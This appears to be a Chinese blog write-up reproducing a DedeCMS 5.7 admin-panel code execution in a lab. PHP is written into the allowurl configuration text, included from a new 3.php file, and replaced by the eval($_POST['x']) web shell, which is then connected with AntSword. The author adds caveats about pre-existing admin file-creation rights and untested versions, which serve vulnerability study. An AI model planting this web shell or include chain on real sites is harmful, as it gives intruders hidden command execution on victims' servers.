ailx10说：这篇是我2024年9月写的。织梦的配置编辑功能这次让我试着往文本里写 PHP，再新建一个 PHP 去包含它，最后访问确认并连接。表面上像把一个普通配置变成代码，仔细看却发现我原本已经能在后台创建可执行文件，所以更得分清新增风险在哪里。笔记仍把整个顺序留着：写入的内容、包含的位置、解释器实际执行的东西。这种对权限的回看也挺有用，不能因为操作步骤多，就默认每一步都带来了新的权限；有时只是把手里已有的能力绕了一圈。

---

DedeCMS管理员在allowurl编辑写PHP到文本，再新建PHP include\_once此文本并访问，换一句话后蚁剑连接。

核查提示：实际已拥有新建PHP能力，新建文件本身也可执行，需分清配置文本注入的额外风险；实测SP2并未证明所有低于5.7.106版本。 原实验和代码未重新运行，图内细节有待核验。

周末复现一下织梦 CMS 5.7.106 后台远程代码执行，这是一个后台漏洞，在低于 5.7.106 的版本中均存在，我复现的环境是织梦CMS 5.7 SP2（DedeCMS 5.7.7），需要管理员权限。拿不到管理员账号，都是白忙活。首先登录后台，在`/dede/article_allowurl_edit.php`网址中输入载荷，然后新建一个php文件来包含载荷所在的文件，就能实现远程代码执行。

（1）管理员在历史测试环境中编辑相关配置文件；实验依赖已有的后台文件操作权限。

```
<?php phpinfo();?>
```

![](/notes-assets/20cf5889ec1c75d9d1e4.webp)

（2）创建 3.php，内容如下，试图文件包含：

```
<?php Include_once("../data/admin/allowurl.txt"); ?>
```

![](/notes-assets/ebe379f08444a52d1908.webp)

![](/notes-assets/2e1497fb5abc4656ee61.webp)

（3）访问 3.php ，文件包含成功

```
http://192.168.0.107/uploads/3.php
```

![](/notes-assets/b4916e54f801c7234b02.webp)

（4）准备一句话木马

```
<?php @eval($_POST['x']); ?>
```

![](/notes-assets/0fbc8f88557e6d9382e7.webp)

（5）尝试包含一句话木马（还是访问上面的3.php），这里使用蚁剑直接连接，成功getshell

![](/notes-assets/e515d823f4b8148067af.webp)

![](/notes-assets/b21deeb201d20d2a0395.webp)

当账号已经能创建可执行文件时，问题的边界就得说得更细。把已有权限和额外能力分别交代，才不会让一个配置案例替所有代码执行情形作结论。
